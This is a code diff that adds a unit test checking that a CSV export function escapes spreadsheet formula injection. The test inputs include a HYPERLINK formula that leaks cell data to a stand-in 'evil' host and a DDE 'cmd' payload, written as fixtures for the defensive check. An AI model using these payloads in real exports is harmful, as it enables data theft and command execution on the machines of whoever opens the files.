@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { diffEntriesToCsv, diffVersionPayload, filterDiffEntries, summarizeDiff } from "@/lib/version-diff";
+import { diffEntriesToCsv, diffVersionPayload, filterDiffEntries, summarizeDiff, toCsvRow } from "@/lib/version-diff";
 
 describe("version diff", () => {
   it("detects added, removed, and changed fields", () => {
@@ -79,5 +79,34 @@ describe("version diff", () => {
     expect(csv).toContain("path,kind,before,after");
     expect(csv).toContain("manifest.name");
     expect(csv).toContain("changed");
+  });
+
+  it("neutralizes spreadsheet formula injection in CSV cells", () => {
+    // Diff values are developer-controlled manifest content; formula-leading
+    // characters must be prefixed so Excel treats the cell as text.
+    expect(toCsvRow('=HYPERLINK("http://evil/?"&A1)')).toBe(
+      '"\'=HYPERLINK(""http://evil/?""&A1)"',
+    );
+    expect(toCsvRow("+1234567890")).toBe("\"'+1234567890\"");
+    expect(toCsvRow("-2+3+cmd|' /C calc'!A0")).toBe("\"'-2+3+cmd|' /C calc'!A0\"");
+    expect(toCsvRow("@SUM(A1:A9)")).toBe("\"'@SUM(A1:A9)\"");
+    expect(toCsvRow("\tleading-tab")).toBe("\"'\tleading-tab\"");
+
+    // Plain values stay untouched.
+    expect(toCsvRow("plain value")).toBe('"plain value"');
+    expect(toCsvRow({ nested: "=ok inside json" })).toBe(
+      '"{""nested"":""=ok inside json""}"',
+    );
+
+    const csv = diffEntriesToCsv([
+      {
+        path: "manifest.homepage",
+        kind: "changed",
+        before: "https://ok.example",
+        after: '=HYPERLINK("http://evil/?"&A1)',
+      },
+    ]);
+    expect(csv).not.toContain('"=HYPERLINK');
+    expect(csv).toContain("'=HYPERLINK");
   });
 });
